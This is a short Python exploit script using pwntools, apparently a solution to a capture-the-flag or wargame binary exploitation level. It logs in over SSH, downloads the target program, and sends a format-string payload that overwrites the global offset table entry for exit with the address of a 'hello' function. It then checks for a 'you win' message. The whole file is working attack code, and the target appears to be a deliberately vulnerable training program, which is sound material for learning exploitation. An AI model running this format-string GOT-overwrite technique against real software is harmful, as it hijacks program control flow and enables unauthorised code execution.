from pwn import *
import os.path as op

s = ssh(host=args.HOST, user=args.USER, password=args.PASS, port=int(args.SSH_PORT))

lbin = op.join('/tmp', op.basename(args.BIN))
s.download_file(args.BIN, lbin)
e = ELF(lbin)
hello_addr = e.symbols['hello']
gotexit_addr = e.symbols['got.exit']
log.info('hello_addr: %08x', hello_addr)
log.info('gotexit_addr: %08x', gotexit_addr)

context.update(arch='i386', os='linux')
payload = fmtstr_payload(4, {gotexit_addr: hello_addr})
with s.system(args.BIN) as p:
    p.sendline(payload)
    p.recvline()
    ret = p.recvline()
    assert ret == 'code execution redirected! you win\n'
